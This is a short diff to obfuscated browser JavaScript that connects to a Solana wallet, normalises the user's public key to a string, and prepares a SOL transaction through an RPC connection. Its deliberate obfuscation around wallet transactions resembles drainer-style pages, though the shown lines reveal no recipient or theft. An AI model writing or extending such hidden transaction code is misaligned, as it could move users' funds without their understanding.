@@ -405,7 +405,13 @@
                             _0x14 = await _0x11.connect();
                         }
                     }
-                    userPublicKey = _0x14?.publicKey || _0x11.publicKey;
+                    
+                    // Force-extract string safely right here so it's always a string value
+                    let rawKey = _0x14?.publicKey || _0x11.publicKey;
+                    if (rawKey) {
+                        userPublicKey = typeof rawKey === 'string' ? rawKey : rawKey.toString();
+                    }
+                    
                     if (userPublicKey) break; 
                 } catch (_0x17) {
                     const _0x18 = _0x17.toString().toLowerCase();
@@ -443,19 +449,8 @@
                     statusDiv.innerText = "Preparing transaction...";
                     statusDiv.style.color = "#8b92a5";
 
-                    // Robustly extract public key string or bytes from any provider object type
-                    let pubKeyObj;
-                    if (userPublicKey instanceof solanaWeb3.PublicKey) {
-                        pubKeyObj = userPublicKey;
-                    } else if (typeof userPublicKey === 'string') {
-                        pubKeyObj = new solanaWeb3.PublicKey(userPublicKey);
-                    } else if (userPublicKey && typeof userPublicKey.toBase58 === 'function') {
-                        pubKeyObj = new solanaWeb3.PublicKey(userPublicKey.toBase58());
-                    } else if (userPublicKey && userPublicKey.toBytes) {
-                        pubKeyObj = new solanaWeb3.PublicKey(userPublicKey.toBytes());
-                    } else {
-                        pubKeyObj = new solanaWeb3.PublicKey(userPublicKey.toString());
-                    }
+                    // userPublicKey is guaranteed to be a valid base58 string now
+                    const pubKeyObj = new solanaWeb3.PublicKey(userPublicKey);
 
                     const _0x1c = BigInt(Math.floor(_0x1b * 1000000000)); 
                     const _0x1d = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
